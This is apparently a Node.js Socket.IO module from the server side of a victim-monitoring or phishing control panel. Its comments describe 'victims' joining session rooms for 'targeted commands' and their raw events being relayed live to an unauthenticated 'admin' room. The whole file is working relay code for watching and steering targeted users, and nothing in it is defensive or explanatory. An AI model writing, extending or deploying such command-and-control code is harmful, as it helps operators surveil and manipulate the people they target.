let io;

function setupSocket(socketIO) {
  io = socketIO;

  io.on('connection', (socket) => {
    console.log('Socket connected:', socket.id);

    // Auto-join victim session room from query params
    const sessionIdFromQuery = socket.handshake?.query?.sessionId;
    if (sessionIdFromQuery) {
      socket.join(sessionIdFromQuery);
      console.log(`Socket ${socket.id} auto-joined session room: ${sessionIdFromQuery}`);
    }

    // Admin joins admin room
    socket.on('join-admin', (token) => {
      // In production, verify JWT here
      socket.join('admin-room');
      console.log('Admin joined admin-room:', socket.id);
    });

    // Victim joins their session room for targeted commands
    socket.on('join-session', (sessionId) => {
      if (sessionId) {
        socket.join(sessionId);
        console.log(`Socket ${socket.id} joined session room: ${sessionId}`);
      }
    });

    // Victim events broadcast to admin room
    socket.on('victim-raw-event', (data) => {
      io.to('admin-room').emit('victim-event', data);
    });

    socket.on('disconnect', () => {
      console.log('Socket disconnected:', socket.id);
    });
  });
}

function getIO() {
  if (!io) throw new Error('Socket.IO not initialized');
  return io;
}

function emitToAdmin(event, data) {
  if (io) {
    io.to('admin-room').emit(event, data);
  }
}

module.exports = { setupSocket, getIO, emitToAdmin };